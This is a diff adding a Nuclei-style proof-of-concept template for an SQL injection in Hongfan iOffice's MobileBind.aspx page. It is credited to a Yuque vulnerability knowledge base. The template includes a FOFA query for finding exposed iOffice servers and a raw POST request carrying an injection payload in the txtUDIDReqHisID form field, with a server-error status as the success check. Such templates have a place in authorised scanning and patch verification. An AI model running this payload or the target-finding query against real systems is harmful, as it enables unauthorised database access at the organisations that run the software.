@@ -1,0 +1,26 @@
+id: poc-wlrfvdpnqfwnres0
+info:
+  name: 红帆ioffice MobileBind.aspx 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wlrfvdpnqfwnres0'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wlrfvdpnqfwnres0
+    fofa: (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")
+http:
+- raw:
+  - 'POST /ioffice/prg/Mobile/Base/MobileBind.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __EVENTTARGET=ctl00%24cntForm%24cmdUDIDReqHis&__EVENTARGUMENT=&__VIEWSTATE=xxxx&__VIEWSTATEGENERATOR=xxxxx&btVerify=&ctl00%24cntForm%24txtUDIDReqHisID=1)OR 1<user--+-&ctl00%24cntForm%24cmdUDIDReqHis=Button'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
